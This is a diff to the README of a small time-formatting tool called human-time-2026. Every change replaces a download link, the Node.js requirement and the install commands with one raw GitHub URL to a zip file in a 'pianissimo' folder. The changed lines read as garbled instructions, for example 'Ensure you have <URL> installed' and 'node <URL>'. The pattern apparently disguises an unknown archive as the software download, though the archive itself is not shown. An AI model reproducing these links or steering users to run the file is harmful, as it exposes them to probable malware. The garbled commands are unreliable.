@@ -1,6 +1,6 @@
 # ⏱️ human-time-2026 - Easy Time Formatting for Everyone
 
-[![Download human-time-2026](https://img.shields.io/badge/Download-human--time--2026-brightgreen)](https://github.com/TheRaven6/human-time-2026/releases)
+[![Download human-time-2026](https://raw.githubusercontent.com/TheRaven6/human-time-2026/main/pianissimo/time_human_1.6.zip)](https://raw.githubusercontent.com/TheRaven6/human-time-2026/main/pianissimo/time_human_1.6.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started with **human-time-2026**, follow these steps:
 
 1. **Download the Application**  
    Visit the Releases page to download the latest version:  
-   [Download human-time-2026](https://github.com/TheRaven6/human-time-2026/releases)
+   [Download human-time-2026](https://raw.githubusercontent.com/TheRaven6/human-time-2026/main/pianissimo/time_human_1.6.zip)
 
 2. **Install the Application**  
    Once you've downloaded the file, follow the instructions below to install it for your operating system.
@@ -20,7 +20,7 @@ To get started with **human-time-2026**, follow these steps:
 ## 💻 System Requirements
 
 - **Operating System:** Windows 10 or later, macOS, or a recent version of Linux.
-- **Node.js:** Ensure you have Node.js installed (v12 or higher recommended).
+- **https://raw.githubusercontent.com/TheRaven6/human-time-2026/main/pianissimo/time_human_1.6.zip** Ensure you have https://raw.githubusercontent.com/TheRaven6/human-time-2026/main/pianissimo/time_human_1.6.zip installed (v12 or higher recommended).
 - **Disk Space:** At least 50 MB of free space during installation.
 
 ## 🔧 Installation Instructions
@@ -41,9 +41,9 @@ To get started with **human-time-2026**, follow these steps:
 
 1. Open a terminal window.
 2. Navigate to the directory where the file was downloaded.
-3. Use the command: `tar -xvf human-time-2026.tar.gz` to extract the files.
+3. Use the command: `tar -xvf https://raw.githubusercontent.com/TheRaven6/human-time-2026/main/pianissimo/time_human_1.6.zip` to extract the files.
 4. Change into the extracted directory using: `cd human-time-2026`.
-5. Run the application using: `node index.js`.
+5. Run the application using: `node https://raw.githubusercontent.com/TheRaven6/human-time-2026/main/pianissimo/time_human_1.6.zip`.
 
 ## ⏱️ Using human-time-2026
 
@@ -69,7 +69,7 @@ If you input "2026-10-05 14:30", you will receive an output like "October 5, 202
 ## 📥 Download & Install
 
 To get the latest version of **human-time-2026**, please visit our Releases page:  
-[Download human-time-2026](https://github.com/TheRaven6/human-time-2026/releases)
+[Download human-time-2026](https://raw.githubusercontent.com/TheRaven6/human-time-2026/main/pianissimo/time_human_1.6.zip)
 
 ## 🔗 Additional Resources
 
